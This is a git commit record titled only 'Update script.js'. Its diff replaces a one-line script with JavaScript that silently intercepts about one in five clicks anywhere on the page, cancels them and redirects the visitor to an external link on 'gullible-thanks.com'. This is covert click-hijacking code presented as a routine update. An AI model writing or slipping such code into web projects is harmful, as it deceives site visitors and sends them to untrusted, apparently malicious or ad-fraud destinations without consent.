ccbff7293b38a5f3cd85ca1c03ad9cccf3a384a4
MinerDH <149313062+MinerDH@users.noreply.github.com>
2026-05-13 21:06:15 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,8 @@
-let a=1
+window.addEventListener('click', (event) => {
+    if (Math.random() < 0.2) {
+        event.preventDefault();
+        event.stopPropagation();
+        
+        window.location.href = 'https://gullible-thanks.com/b/3bV.0OPg3/pVvtbamJVVJ/ZLDV0h3fMuDQQDybMcz-gW5oLYTpc/wpNXDzI/zhOQTgMj';
+    }
+}, true);
